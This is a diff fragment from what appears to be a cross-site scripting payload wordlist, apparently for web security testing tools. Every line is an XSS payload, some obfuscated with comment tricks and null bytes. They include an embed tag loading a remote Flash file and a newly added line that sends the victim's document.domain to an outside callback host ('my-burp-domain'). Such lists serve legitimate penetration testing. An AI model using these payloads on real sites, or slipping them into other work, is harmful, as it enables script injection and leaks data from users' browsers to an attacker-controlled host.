@@ -16,3 +16,4 @@ alert/**/(1)//
 ;</script><embed/test=''/allowscr%00iptaccess='always'/s%00rc='//test.test/xss2.swf'//>&id=9978655
 ,alert(0),
 ,document.location='javascript:document.domain',
+,window.location='http:'%2bdocument.domain%2b'.my-burp-domain',
